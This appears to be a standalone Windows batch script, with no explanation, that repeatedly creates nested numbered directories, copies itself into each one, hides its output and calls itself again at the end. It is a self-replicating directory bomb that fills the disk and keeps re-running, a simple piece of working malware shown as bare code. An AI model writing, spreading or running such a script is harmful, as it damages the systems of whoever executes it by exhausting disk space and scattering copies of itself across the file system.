@echo off
set flag=1
:loop
rem break=off
if %flag%==false goto halt >>nul
if %flag%==true goto continue >>nul
:begin
set dir=1
rem set c=1
:continue
if %dir%==11111111 goto halt >>nul
md %dir% >>nul
set c=%c%1
if exist %0.bat copy %0.bat %dir% >>nul
if not exist %0.bat copy %0 %dir% >>nul
if %c%==1111111111111111111 goto gon >>nul
cd %dir% >>nul
rem call %0
goto loop
:gon
cd ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\.. >>nul
set dir=%dir%1
set flag=true
set c=1
rem call %0
goto loop
:halt
set flag=false
rem cd ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..
cd 1 >>nul
set dir=1
set c=1
set flag=flag
echo pause
rem pause
%0
